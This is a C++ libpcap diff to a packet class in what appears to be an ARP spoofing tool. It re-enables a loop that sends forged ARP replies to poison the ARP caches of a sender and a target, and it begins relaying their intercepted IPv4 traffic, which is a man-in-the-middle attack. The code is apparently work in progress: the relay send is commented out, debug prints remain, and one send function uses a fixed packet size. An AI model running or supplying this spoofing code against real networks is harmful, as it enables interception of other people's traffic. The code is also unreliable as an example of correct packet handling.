@@ -69,26 +69,44 @@ bool Packet::setMyInterfaceInfo(){
 
 void Packet::setEthHeader(u_int8_t* srcMac, u_int8_t* dstMac, u_int16_t ethType){
     for (int i = 0; i < ETH_ADDR_LEN; i++){
-        ethArpPacket.eth.srcMac[i] = srcMac[i];
-        ethArpPacket.eth.dstMac[i] = dstMac[i];
+        ethHeader.srcMac[i] = srcMac[i];
+        ethHeader.dstMac[i] = dstMac[i];
     }
-    ethArpPacket.eth.ethType = htons(ethType);
+    ethHeader.ethType = htons(ethType);
 }
 
 
 void Packet::setArpHeader(u_int8_t* srcMac, u_int32_t srcIp, u_int8_t* dstMac, u_int32_t dstIp, u_int16_t opCode){
     for (int i = 0; i < ETH_ADDR_LEN; i++){
-        ethArpPacket.arp.srcMac[i] = srcMac[i];
-        ethArpPacket.arp.dstMac[i] = dstMac[i];
+        arpHeader.srcMac[i] = srcMac[i];
+        arpHeader.dstMac[i] = dstMac[i];
     }
-    ethArpPacket.arp.srcIp = srcIp;
-    ethArpPacket.arp.dstIp = dstIp;
-    ethArpPacket.arp.op = htons(opCode);
+    arpHeader.srcIp = srcIp;
+    arpHeader.dstIp = dstIp;
+    arpHeader.op = htons(opCode);
 }
 
 
 void Packet::sendPacket(){
-    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&ethArpPacket), sizeof(ethArpHdr));
+    int res = 0;
+    if (ethHeader.ethType == htons(ethHdr::ARP)){
+        ethArpHeader.eth = ethHeader;
+        ethArpHeader.arp = arpHeader;
+        res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&ethArpHeader), sizeof(ethArpHdr));
+    } else if (ethHeader.ethType == htons(ethHdr::IPv4)){
+        ethIpv4Header.eth = ethHeader;
+        ethIpv4Header.ipv4 = Ipv4Header;
+        res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&ethIpv4Header), sizeof(ethIpv4Hdr));
+    }
+
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+    }
+}
+
+
+void Packet::sendPacket(u_char* packet){
+    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(packet), sizeof(ethArpHdr));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
     }
@@ -144,7 +162,7 @@ void Packet::sendSpoofedPacket(u_int32_t senderIp, u_int32_t targetIp, u_int16_t
     sendPacket();
 }
 
-/*
+
 void Packet::continuousArpSpoofing(){
     while(true) {
         packetInfo capturedPacketInfo = captureNextPacket();
@@ -154,28 +172,35 @@ void Packet::continuousArpSpoofing(){
             break;
         }
 
-        ethHdr* ethHeader = (ethHdr*)(capturedPacketInfo.packet);
+        ethHdr* ethhdr = (ethHdr*)(capturedPacketInfo.packet);
         for (auto iter = senderTargetTable.begin(); iter != senderTargetTable.end(); iter++){
             //When ARP packet
-            if (ethHeader->ethType == htons(ethHdr::ARP)){
-                arpHdr* arpHeader = (arpHdr*)(capturedPacketInfo.packet + ETH_ADDR_LEN);
-                if (arpHeader->srcIp == iter->sender.ip && arpHeader->dstIp == iter->target.ip){
-                    sendSpoofedPacket(arpHeader->srcIp, arpHeader->dstIp, arpHdr::ArpReply);
+            if (ethhdr->ethType == htons(ethHdr::ARP)){
+                arpHdr* arphdr = (arpHdr*)(capturedPacketInfo.packet + ETH_HDR_LEN);
+                fprintf(stderr, "%u\n", ntohl(arphdr->dstIp));
+                fprintf(stderr, "%u\n", ntohl(iter->sender.ip));
+                if (arphdr->srcIp == iter->sender.ip && arphdr->dstIp == iter->target.ip){
+                    sendSpoofedPacket(arphdr->srcIp, arphdr->dstIp, arpHdr::ArpReply);
                     break;
                 }
             }
             //When IPv4 packet -> Send Relay Packet
-            else if (ethHeader->ethType == htons(ethHdr::IPv4)){
-                ipv4Hdr* ipv4Header = (ipv4Hdr*)(capturedPacketInfo.packet + ETH_ADDR_LEN);
-                if (ipv4Header->srcIp == iter->sender.ip && ipv4Header->dstIp == iter->target.ip){
-                    //sethdr -> send
+            else if (ethhdr->ethType == htons(ethHdr::IPv4)){
+                ipv4Hdr* ipv4hdr= (ipv4Hdr*)(capturedPacketInfo.packet + ETH_HDR_LEN);
+                if (ipv4hdr->srcIp == iter->sender.ip && ipv4hdr->dstIp != interfaceIp){
+                    for (int i = 0; i < ETH_ADDR_LEN; i++) ethhdr->srcMac[i] = interfaceMac[i];
+                    if (arpTable.count(iter->target.ip) == 0){
+                        resolveMacByIp(iter->target.ip);
+                        for (int i = 0; i < ETH_ADDR_LEN; i++) ethhdr->dstMac[i] = arpTable[iter->target.ip][i];
+                    }
+                    //sendPacket(capturedPacketInfo.packet);
                     break;
                 }
             }
         }
     }
 }
-*/
+
 
 void Packet::closeLiveCapture(){
     pcap_close(pcap);
